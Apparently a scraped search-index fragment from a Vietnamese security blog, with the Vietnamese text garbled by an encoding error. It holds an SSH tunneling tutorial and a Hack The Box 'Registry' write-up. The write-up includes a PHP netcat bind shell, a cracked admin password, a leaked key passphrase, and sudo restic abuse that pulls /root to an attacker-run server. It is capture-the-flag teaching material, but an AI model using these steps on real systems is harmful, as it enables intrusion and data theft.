t√†i kho·∫£n ƒë·ªÅu c√≥ th·ªÉ cho ph√©p b·∫°n t√πy bi·∫øn c√†i ƒë·∫∑t t√πy theo s·ªü th√≠ch c·ªßa m√¨nh v√† t√°ch bi·ªát so v·ªõi c√°c th√†nh vi√™n kh√°c trong khi s·ª≠ d·ª•ng chung m√°y t√≠nh. B√†i vi·∫øt n√†y m√¨nh s·∫Ω n√™u m·ªôt s·ªë c√°ch ƒë·ªÉ chuy·ªÉn ƒë·ªïi t√†i kho·∫£n ng∆∞·ªùi d√πng tr√™n Windows, nghe c√≥ v·∫ª kh√° ƒë∆°n gi·∫£n ƒë√∫ng kh√¥ng :D","title":"L√†m th·∫ø n√†o ƒë·ªÉ chuy·ªÉn ƒë·ªïi t√†i kho·∫£n tr√™n Windows (How do I switch users in Windows)?"},{"content":"SSH Tunneling Giao th·ª©c SSH hi·ªán nay l√† m·ªôt trong nh·ªØng giao th·ª©c ph·ªï bi·∫øn nh·∫•t ƒë·ªÉ tunneling v√† port forwarding. SSH Tunnel cho ph√©p trao ƒë·ªïi d·ªØ li·ªáu th√¥ng qua m·ªôt k√™nh m√£ ho√°. V·ªõi vi·ªác thi·∫øt l·∫≠p SSH Tunnel c·ª±c k·ª≥ ƒë∆°n gi·∫£n v√† nhi·ªÅu ·ª©ng d·ª•ng n√™n giao th·ª©c n√†y ng√†y c√†ng ph·ªï bi·∫øn. ·ªû b√†i vi·∫øt n√†y m√¨nh s·∫Ω n√≥i v·ªÅ m·ªôt s·ªë ·ª©ng d·ª•ng c·ªßa SSH Tunnel.\nLocal Port Forwarding SSH Local Port Forwarding ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ chuy·ªÉn ti·∫øp 1 port t·ª´ m√°y local ƒë·∫øn m√°y server (ho·∫∑c ng∆∞·ª£c l·∫°i) b·∫±ng c√°ch s·ª≠ d·ª•ng giao th·ª©c SSH ƒë·ªÉ v·∫≠n chuy·ªÉn.\nNg∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠ d·ª•ng Local Port Forwarding ƒë·ªÉ:\n K·∫øt n·ªëi v·ªõi d·ªãch v·ª• trong m·∫°ng n·ªôi b·ªô t·ª´ b√™n ngo√†i. S·ª≠ d·ª•ng ƒë·ªÉ chuy·ªÉn file qua internet. T·∫°o phi√™n v√† chuy·ªÉn t·∫≠p tin qua Jump Server (c√°i n√†y m√¨nh ch∆∞a s·ª≠ d·ª•ng bao gi·ªù :().  V√≠ d·ª• Th·ª≠ t∆∞·ªüng t∆∞·ª£ng b·∫°n c√†i ƒë·∫∑t m·ªôt trang web test ·ªü c·ªïng 80 tr√™n server c·ªßa b·∫°n, nh∆∞ng b·∫°n l·∫°i kh√¥ng mu·ªën public trang web ƒë√≥ ra m√† ch·ªâ mu·ªën s·ª≠ d·ª•ng ·ªü tr√™n local. Ho·∫∑c l√† b·∫°n ƒëang ·ªü nh√†, b·∫°n mu·ªën v√†o trang web ƒë∆∞·ª£c ƒë·∫∑t tr√™n server c·ªßa c√¥ng ty m√† ch·ªâ ƒë∆∞·ª£c v√†o v·ªõi ip n·ªôi b·ªô. Nh∆∞ng b·∫°n l·∫°i c√≥ SSH ƒë·∫øn server ƒë√≥, v·∫≠y b·∫°n c√≥ th·ªÉ chuy·ªÉn ti·∫øp port t·ª´ server c·ªßa c√¥ng ty v·ªÅ port tr√™n m√°y b·∫°n b·∫±ng c√°ch.\n1  ssh -L 9000:127.0.0.1:80 user@\u0026lt;ip address\u0026gt;   V·∫≠y b√¢y gi·ªù b·∫°n c√≥ th·ªÉ truy c·∫≠p v√†o website n·∫±m tr√™n server c√¥ng ty b·∫±ng c√°ch truy c·∫≠p http://localhost:9000.\nHay m·ªôt v√≠ d·ª• kh√°c l√† b·∫°n mu·ªën truy c·∫≠p database tr√™n website c·ªßa b·∫°n nh∆∞ng b·∫°n kh√¥ng th√≠ch d√πng terminal m√† b·∫°n l·∫°i th√≠ch d√πng giao di·ªán h∆°n. V·∫≠y b·∫°n c√≥ th·ªÉ chuy·ªÉn c·ªïng 3306 tr√™n server v·ªÅ local m√°y b·∫°n r·ªìi s·ª≠ d·ª•ng m·ªôt s·ªë ch∆∞∆°ng tr√¨nh ƒë·ªÉ truy c·∫≠p CSDL c·ªßa b·∫°n nh∆∞ Navicat hay Workbench Mysql.\nRemote Port Forwarding SSH Remote Port Forwarding cho ph√©p b·∫°n chuy·ªÉn l∆∞u l∆∞·ª£ng truy c·∫≠p t·ª´ 1 port ·ªü m√°y c·ªßa b·∫°n l√™n SSH server.\nC√∫ ph√°p\n1  ssh -R 8080:localhost:80 public.example.com   ƒêi·ªÅu n√†y cho ph√©p b·∫•t c·ª© ai truy c·∫≠p v√†o m√°y ch·ªß public.example.com v√†o c·ªïng 8080 s·∫Ω ƒë∆∞·ª£c chuy·ªÉn ƒë·∫øn c·ªïng 80 tr√™n m√°y b·∫°n.\nTuy nhi√™n, Remote Port Forwarding m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c t·∫Øt tr√™n SSH. ƒê·ªÉ k√≠ch ho·∫°t t√≠nh nƒÉng n√†y, b·∫°n c·∫ßn th√™m m·ªôt d√≤ng v√†o t·ªáp c·∫•u h√¨nh SSH /etc/ssh/sshd_config\n1  GatewayPorts yes   V√† kh·ªüi ƒë·ªông l·∫°i SSH\n1  $ sudo service ssh restart   V√≠ d·ª• V√≠ d·ª• b·∫°n ƒëang code 1 website, nh∆∞ng kh√°ch h√†ng ƒëang mu·ªën b·∫°n demo t·ª´ xa. Do code ƒëang n·∫±m tr√™n m√°y b·∫°n, v√† b·∫°n kh√¥ng c√≥ th·ªùi gian deploy l√™n server ƒë·ªÉ demo cho kh√°ch h√†ng. B·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng Remote Port Forwarding ƒë·ªÉ chuy·ªÉn c·ªïng web tr√™n m√°y local l√™n server ƒë·ªÉ demo cho kh√°ch h√†ng.\n1  ssh -R 80:localhost:80 user@\u0026lt;ip public\u0026gt;   V·∫≠y kh√°ch h√†ng c√≥ th·ªÉ truy c·∫≠p t·ªõi http://l√† c√≥ th·ªÉ v√†o trang m√† b·∫°n ƒëang code tr√™n local r·ªìi.\nHo·∫∑c m·ªôt v√≠ d·ª• kh√°c, ƒë√¢y l√† m·ªôt v√≠ d·ª• v·ªÅ m·ªôt machine t√™n Registry tr√™n Hackthebox.\nT·∫°i server machine cho ph√©p user www-data s·ª≠ d·ª•ng c√¢u l·ªánh v·ªõi quy·ªÅn root nh∆∞ sau:\n1 2  User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest*   Restic l√† 1 opensource s·ª≠ d·ª•ng ƒë·ªÉ backup, c·∫ßn s·ª≠ d·ª•ng Restic server ƒë·ªÉ backup. Tuy nhi√™n tr√™n server l·∫°i kh√¥ng c√≥ Restic server. V·∫≠y n√™n m√¨nh ƒë√£ d·ª±ng m·ªôt Restic server ·ªü tr√™n m√°y local v√† s·ª≠ d·ª•ng Remote Port Forwarding ƒë·ªÉ k·∫øt n·ªëi Restic server l√™n machine.\n1  ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159   V√† sau ƒë√≥ m√¨nh ƒë√£ backup l·∫°i ƒë∆∞·ª£c th∆∞ m·ª•c /root v·ªõi quy·ªÅn root\n1 2 3 4 5 6 7 8 9 10 11 12  www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root \u0026lt;n/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$   Machine n√†y ƒë√£ ƒë∆∞·ª£c m√¨nh vi·∫øt solusion ·ªü t·∫°i blog c·ªßa m√¨nh. N·∫øu b·∫°n ƒë·ªçc c·∫£m th·∫•y h·∫•p d·∫´n th√¨ c√≥ th·ªÉ gh√© qua blog c·ªßa m√¨nh t·∫°i https://minhtuanact.github.io/post/writeup-htb-registry/\n Tr√™n ƒë√¢y l√† m·ªôt v√†i ki·∫øn th·ª©c m√¨nh l∆∞·ª£m nh·∫∑t ƒë∆∞·ª£c, mong r·∫±ng n√≥ c√≥ √≠ch cho c√°c b·∫°n. (seeyou)\n Tham kh·∫£o https://www.ssh.com/ssh/tunneling/\nhttps://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/\nhttps://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html\n","permalink":"https://minhtuanact.ml/posts/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding/","summary":"SSH Tunneling Giao th·ª©c SSH hi·ªán nay l√† m·ªôt trong nh·ªØng giao th·ª©c ph·ªï bi·∫øn nh·∫•t ƒë·ªÉ tunneling v√† port forwarding. SSH Tunnel cho ph√©p trao ƒë·ªïi d·ªØ li·ªáu th√¥ng qua m·ªôt k√™nh m√£ ho√°. V·ªõi vi·ªác thi·∫øt l·∫≠p SSH Tunnel c·ª±c k·ª≥ ƒë∆°n gi·∫£n v√† nhi·ªÅu ·ª©ng d·ª•ng n√™n giao th·ª©c n√†y ng√†y c√†ng ph·ªï bi·∫øn. ·ªû b√†i vi·∫øt n√†y m√¨nh s·∫Ω n√≥i v·ªÅ m·ªôt s·ªë ·ª©ng d·ª•ng c·ªßa SSH Tunnel.","title":"SSH Tunneling - Local Port Forwarding v√† Remote Port Forwarding"},{"content":"Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ‚ûú ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.20s latency). Not shown: 905 closed ports, 92 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 5.22 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title. | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up)![](https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png) scanned in 28.38 seconds   M√¨nh th·∫•y cert c√≥ th√¥ng tin\n1  ssl-cert: Subject: commonName=docker.registry.htb   n√™n m√¨nh th√™m v√†o file /etc/passwd\n1  10.10.10.159 docker.registry.htb registry.htb   S·ª≠ d·ª•ng gobuster recon th∆∞ m·ª•c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  gobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l 40 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://docker.registry.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Timeout: 10s =============================================================== 2020/02/10 16:09:49 Starting gobuster =============================================================== /v2 (Status: 301) [Size: 39]   Th·∫•y c√≥ th∆∞ m·ª•c /v2 b√°o m√£ 301 th√¨ trang n√†y c√≥ g·∫Øn basic auth. Th·ª≠ nh·∫≠p admin:admin v√†o th√¨ ƒë∆∞·ª£c :v. C√≥ l·∫Ω auth m√¥ ph·ªèng l·∫°i l·ªói ƒë·∫∑t basic auth qu√° d·ªÖ ƒëo√°n. Sau khi nh·∫≠p ƒë∆∞·ª£c basic auth th√¨ ·ªü docker c√≥ th∆∞ m·ª•c _catalog ƒë·ªÉ ki·ªÉm tra c√≥ image g√¨ trong ƒë·∫•y.\nGet User V·∫≠y l√† ta bi·∫øt ƒë∆∞·ª£c image t√™n l√† g√¨ r·ªìi th√¨ m√¨nh pull docker v·ªÅ xem sao.\nNh∆∞ng trong l√∫c m√¨nh pull docker v·ªÅ th√¨ g·∫∑p l·ªói n√†y\n1 2 3  minhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image Using default tag: latest Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority   H√≥a ra l√† m√¨nh ch∆∞a c√≥ certificate. V·∫≠y th√¨ update certificate th·ªß c√¥ng th√¥i V√†o https://docker.registry.htb t·∫£i file .crt v·ªÅ copy file ƒë·∫•y v√†o\n1 2 3  /usr/local/share/ca-certificates sudo update-ca-certificates sudo service docker restart   1 2 3 4 5 6 7 8  minhtuan@kali:~$ sudo docker login https://docker.registry.htb Username: admin Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded   Th√†nh c√¥ng, l√∫c n√†y ta c√≥ th·ªÉ pull docker v·ªÅ v√† s·ª≠ d·ª•ng b√¨nh th∆∞·ªùng r·ªìi.\n1 2 3 4 5 6  ‚ûú ~ docker pull docker.registry.htb/bolt-image Using default tag: latest latest: Pulling from bolt-image Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b Status: Image is up to date for docker.registry.htb/bolt-image:latest docker.registry.htb/bolt-image:latest   Pull v·ªÅ xong r·ªìi th√¨ chui v√†o th√¥i\n1 2  ‚ûú ~ docker run --rm -it docker.registry.htb/bolt-image:latest root@9818304f783b:/#   Kinh nghi·ªám c·ªßa m√¨nh l√† c·ª© t·∫≠p trung v√†o nh·ªØng folder n√†o n√≥ c·ª±c k·ª≥ nh·∫°y c·∫£m nh∆∞ ssh, r·ªìi m·∫•y th∆∞ m·ª•c c·ªßa user, /var/www/html xem c√≥ g√¨ kh√¥ng. L·ª•c m√£i th√¨ trong th∆∞ m·ª•c /root/.ssh c√≥ file private key ssh. S·ª≠ d·ª•ng ssh2john.py v√† john brute force l·∫•y pass private key nh∆∞ng m√† k ƒë∆∞·ª£c. N√™n m√¨nh quay l·∫°i docker xem b√™n trong c√≤n g√¨ n·ªØa kh√¥ng. Sau m·ªôt h·ªìi t√¨m ki·∫øm l√πng s·ª•c th√¨ m√¨nh th·∫•y c√≥ 1 file n√†y ·ªü ƒë√¢y.\n1 2 3 4 5 6 7 8  root@9818304f783b:/etc/profile.d# cat 01-ssh.sh #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \u0026#34;Enter passphrase for /root/.ssh/id_rsa:\u0026#34; send \u0026#34;GkOcz221Ftb3ugog\\n\u0026#34;; expect \u0026#34;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\u0026#34; interact   V·∫≠y ƒë√¢y l√† ƒëo·∫°n ch∆∞∆°ng tr√¨nh t·∫°o kh√≥a private key. M·∫≠t kh·∫©u file id_rsa kia l√† GkOcz221Ftb3ugog. Vi·ªác c√≤n l·∫°i l√† m√¨nh ssh v√†o machine th√¥i.\n1 2 3  ‚ûú registry ssh -i id_rsa root@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: root@10.10.10.159\u0026#39;s password:   K ƒë∆∞·ª£c. C∆° m√† m√¨nh h∆°i ng√¢y th∆°, ssh v√†o root th√¨ b√†i n√†y ƒë√£ d·ªÖ qu√° =)). Xong m√¨nh nh√¨n l·∫°i c√°i t√™n image docker l√† bolt-image. Th·ª≠ s·ª≠ d·ª•ng user ssh l√† bolt xem sao.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ‚ûú registry ssh -i id_rsa bolt@10.10.10.159 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Feb 10 09:35:17 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 5.7% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 32% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 0% IP address for docker0: 172.17.0.1 Processes: 173 Last login: Mon Feb 10 09:06:21 2020 from 10.10.16.7 bolt@bolt:~$ user.txt   V√† ch√∫ng ta c√≥ user\nGet Root M√¨nh s·ª≠ d·ª•ng private key ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o ssh c·ªßa bolt n√™n m√¨nh ch∆∞a th·ªÉ s·ª≠ d·ª•ng sudo right ƒë·ªÉ leo thang ƒë·∫∑c quy·ªÅn ƒë∆∞·ª£c v√¨ khi g√µ sudo -l h·ªá th·ªëng s·∫Ω y√™u c·∫ßu nh·∫≠p m·∫≠t kh·∫©u c·ªßa bolt. M√¨nh ƒë√£ s·ª≠ d·ª•ng LinEnum.sh ƒë·ªÉ khai th√°c ·ªü user bolt n√†y nh∆∞ng ch∆∞a thu ƒë∆∞·ª£c k·∫øt qu·∫£ g√¨. Sau m·ªôt h·ªìi t√¨m t√≤i v√† th·ª≠, ƒëi·ªÅu khi·∫øn cho m√¨nh t·∫≠p trung ti·∫øp l√† v√†o ph·∫ßn web. M√¨nh t√¨m th·∫•y ƒë∆∞·ª£c trong th∆∞ m·ª•c web c√≥ th∆∞ m·ª•c /bolt.\nTrang n√†y ƒë∆∞·ª£c t·∫°o b·ªüi Bolt CMS, l√† 1 opensource. Th·ª≠ http://registry.htb/bolt/bolt th√¨ v√†o ƒë∆∞·ª£c trang login. C√¥ng cu·ªôc ti·∫øp theo th√¨ t√¨m ki·∫øm account admin ƒëƒÉng nh·∫≠p v√†o ƒë√¢y th√¥i. L·ª•c ti·∫øp trong folder /var/www/html/bolt th√¨ c√≥ 1 file db.\n1 2 3 4  bolt@bolt:/var/www/html/bolt/app/database$ ls bolt.db bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db bolt.db: SQLite 3.x database, last written using SQLite version 3022000   Check file th√¨ ƒë√¢y l√† 1 file db SQLite 3. Ti·∫øc l√† tr√™n machine l·∫°i k c√≥ sqlite3 n√™n m√¨nh copy file n√†y v·ªÅ m√°y ƒë·ªÉ ki·ªÉm tra. S·ª≠ d·ª•ng scp ƒë·ªÉ copy file bolt.db v·ªÅ m√°y m√¨nh\n1  ‚ûú registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .   Sau khi ƒë√£ copy xong file th√¨ m√¨nh chui v√†o xem trong ƒë√≥ c√≥ g√¨, m√¨nh t√¨m th·∫•y t√†i kho·∫£n admin ·ªü trong b·∫£ng bolt_users\n1 2 3 4 5 6 7 8 9 10 11 12  ‚ûú registry sqlite3 bolt.db SQLite version 3.31.0 2019-12-29 00:52:41 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .table bolt_authtoken bolt_field_value bolt_pages bolt_users bolt_blocks bolt_homepage bolt_relations bolt_cron bolt_log_change bolt_showcases bolt_entries bolt_log_system bolt_taxonomy sqlite\u0026gt; select * from bolt_users ...\u0026gt; ; 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-02-09 23:27:11|10.10.15.117|Admin|[\u0026#34;themes://basic.php\u0026#34;,\u0026#34;themes://rev.php\u0026#34;,\u0026#34;themes://base-2018/meh.twig\u0026#34;,\u0026#34;themes://meh.twig\u0026#34;,\u0026#34;themes://shell.php\u0026#34;]|1||||0||[\u0026#34;root\u0026#34;,\u0026#34;everyone\u0026#34;] sqlite\u0026gt;   S·ª≠ d·ª•ng john ƒë·ªÉ crack passwd admin ra ƒë∆∞·ª£c passwd l√† strawberry, ƒëƒÉng nh·∫≠p v√†o http://registry.htb/bolt/bolt. ·ªû ƒë√¢y c√≥ 1 tr√¨nh upload file, ta th·ª≠ upload file shell l√™n ƒë√¢y nh∆∞ng m√† n√≥ k cho upload file php l√™n.\nS·ª≠a 1 ch√∫t config ·ªü ƒë√¢y ƒë·ªÉ server cho ph√©p upload file php\nSau ƒë·∫•y ta l∆∞u l·∫°i r·ªìi chuy·ªÉn sang ch·ª©c nƒÉng upload ƒë·∫©y shell l√™n. Ban ƒë·∫ßu m√¨nh s·ª≠ d·ª•ng https://github.com/flozz/p0wny-shell nh∆∞ng m√† m√¨nh k th·ªÉ reverse shell l·∫°i m√°y m√¨nh ƒë∆∞·ª£c. M√¨nh ƒë√£ chuy·ªÉn h∆∞·ªõng sang s·ª≠ d·ª•ng bind shell ƒë·ªÉ RCE. S·ª≠ d·ª•ng file shell.php\n1  \u0026lt;?php system(\u0026#34;nc.traditional -lvp 4444 -e /bin/bash\u0026#34;);   Upload l√™n r·ªìi b√™n m√°y m√¨nh s·ª≠ d·ª•ng l·ªánh\n1 2  ‚ûú registry nc -nv 10.10.10.159 4444 (UNKNOWN) [10.10.10.159] 4444 (?) open   Upgrade l√™n pty shell\n1  python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   ƒê·∫øn ƒë√¢y r·ªìi l·∫°i ti·∫øp t·ª•c s·ª≠ d·ª•ng LinEnum.sh ƒë·ªÉ ki·ªÉm tra xem c√≥ g√¨ kh√¥ng th√¨ m√¨nh th·∫•y c√°i n√†y\n1 2 3 4 5 6  [+] We can sudo without supplying a password! Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest*   T·∫≠p trung h·∫øt c∆°m g·∫°o v√†o ph·∫ßn n√†y ƒë·ªÉ l·∫•y root =)).\nGi·ªõi thi·ªáu s∆° qua m·ªôt ch√∫t, restic l√† 1 opensource s·ª≠ d·ª•ng ƒë·ªÉ backup, n√≥i r√µ h∆°n th√¨ m√¨nh c≈©ng ch·ªãu v√¨ c√°i n√†y qu√° m·ªõi so v·ªõi m√¨nh =)), ch·∫£ bi·∫øt g√¨ c·∫£.\nNg·ªìi ƒë·ªçc document c·ªßa n√≥ t·∫°i ƒë√¢y https://restic.readthedocs.io/en/latest/ Sau m·ªôt kho·∫£ng th·ªùi gian ƒë·ªçc doc v·ªõi l√™n m·∫°ng t√¨m exam c√¢u l·ªánh c·ªßa n√≥ th√¨ m·ªõi bi·∫øt l√† n√≥ c·∫ßn 1 server ƒë·ªÉ backup. Ng∆∞·ªùi b·∫°n ch∆°i c√πng m√¨nh b·∫£o l√† n√≥ c√≥ 1 restic server, n√≥ t·ª± ƒë·ªông ch·∫°y tr√™n c·ªïng 8000. M√¨nh ng·ªìi t·∫£i file binary c·ªßa n√≥ ·ªü ƒë√¢y https://github.com/restic/rest-server/releases\n1 2 3 4 5 6  ‚ûú Downloads ./rest-server-0.9.7-linux-amd64 rest-server 0.9.7 compiled with go1.10 on linux/amd64 Data directory: /tmp/restic Authentication disabled Private repositories disabled Starting server on :8000   Ch·∫°y server xong th√¨ t·∫°o repo restic ƒë·ªÉ l∆∞u file backup\n1 2 3 4 5 6 7 8 9  ‚ûú Downloads apt-get install restic ‚ûú Downloads restic init -r /tmp/restic enter password for new repository: enter password again: created restic repository 03ab053496 at /tmp/restic Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irrecoverably lost.   Th·ª±c hi·ªán remote port forwarding l√™n machine\n1  ‚ûú registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159   S·ª≠ d·ª•ng restic v·ªõi quy·ªÅn sudo backup th∆∞ m·ª•c /root\n1 2 3 4 5 6 7 8 9 10 11 12  www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root \u0026lt;n/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$   Ngon, l∆∞u snapshot ƒë∆∞·ª£c v·ªÅ m√°y m√¨nh r·ªìi, ƒëi·ªÅu quan tr·ªçng gi·ªù l√† t√¨m l·ªánh ƒë·ªÉ ƒë·ªçc n√≥ ra th√¥i. Ng·ªìi cat m·∫•y c√°i folder trong /tmp/restic m√† n√≥ m√£ h√≥a h·∫øt lu√¥n. Ng·ªìi ƒë·ªçc doc th·∫•y ƒëo·∫°n n√†y, h√≥a ra l√† n√≥ d√πng restore ch·ª© n√≥ k ph·∫£i ki·ªÉu m·ªü ra r·ªìi ƒë·ªçc ƒë∆∞·ª£c.\n1 2 3 4  ‚ûú restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root enter password for repository: repository 03ab0534 opened successfully, password is correct restoring \u0026lt;Snapshot e5ef88b3 of [/root] at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt\u0026gt; to /tmp/restic-root   Xong r·ªìi, v√†o /tmp/restic-root l·∫•y c·ªù cu·ªëi th√¥i ;))\n1 2 3 4 5 6 7 8  ‚ûú restic cd /tmp/restic-root ‚ûú restic-root ;s zsh: command not found: s ‚ûú restic-root ls root ‚ûú restic-root cd root ‚ûú root ls config.yml cron.sh root.txt   Thanks C·∫£m ∆°n 2 th√†nh vi√™n trong team m√¨nh ƒë√£ gi√∫p ƒë·ª° m√¨nh trong l√∫c ch∆°i ;)\n Nguyen Van Khanh B Nguyen Xuan Hoa  Hy v·ªçng b√†i writeup c·ªßa m√¨nh s·∫Ω c√≥ th·ªÉ gi√∫p ƒë·ª° c√°c b·∫°n ƒëi·ªÅu g√¨ ƒë√≥. C·∫£m ∆°n c√°c b·∫°n ƒë√£ ƒë·ªçc ƒë·∫øn ƒë√¢y. M√¨nh s·∫Ω ra nh·ªØng b√†i Writeup Hackthebox khi machine ƒë∆∞·ª£c ƒë√≥ng. C√πng theo d√µi m√¨nh nh√©.\n","permalink":"https://minhtuanact.ml/posts/hackthebox-writeup-registry/","summary":"Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ‚ûú ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.","title":"[Hackthebox Writeup] Registry"},{"content":"SSH Tunneling Giao th·ª©c SSH hi·ªán nay l√† m·ªôt trong nh·ªØng giao th·ª©c ph·ªï bi·∫øn nh·∫•t ƒë·ªÉ tunneling v√† port forwarding. SSH Tunnel cho ph√©p trao ƒë·ªïi d·ªØ li·ªáu th√¥ng qua m·ªôt k√™nh m√£ ho√°. V·ªõi vi·ªác thi·∫øt l·∫≠p SSH Tunnel c·ª±c k·ª≥ ƒë∆°n gi·∫£n v√† nhi·ªÅu ·ª©ng d·ª•ng n√™n giao th·ª©c n√†y ng√†y c√†ng ph·ªï bi·∫øn. ·ªû b√†i vi·∫øt n√†y m√¨nh s·∫Ω n√≥i v·ªÅ m·ªôt s·ªë ·ª©ng d·ª•ng c·ªßa SSH Tunnel.\nLocal Port Forwarding SSH Local Port Forwarding ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ chuy·ªÉn ti·∫øp 1 port t·ª´ m√°y local ƒë·∫øn m√°y server (ho·∫∑c ng∆∞·ª£c l·∫°i) b·∫±ng c√°ch s·ª≠ d·ª•ng giao th·ª©c SSH ƒë·ªÉ v·∫≠n chuy·ªÉn.\nNg∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠ d·ª•ng Local Port Forwarding ƒë·ªÉ:\n K·∫øt n·ªëi v·ªõi d·ªãch v·ª• trong m·∫°ng n·ªôi b·ªô t·ª´ b√™n ngo√†i. S·ª≠ d·ª•ng ƒë·ªÉ chuy·ªÉn file qua internet. T·∫°o phi√™n v√† chuy·ªÉn t·∫≠p tin qua Jump Server (c√°i n√†y m√¨nh ch∆∞a s·ª≠ d·ª•ng bao gi·ªù :().  V√≠ d·ª• Th·ª≠ t∆∞·ªüng t∆∞·ª£ng b·∫°n c√†i ƒë·∫∑t m·ªôt trang web test ·ªü c·ªïng 80 tr√™n server c·ªßa b·∫°n, nh∆∞ng b·∫°n 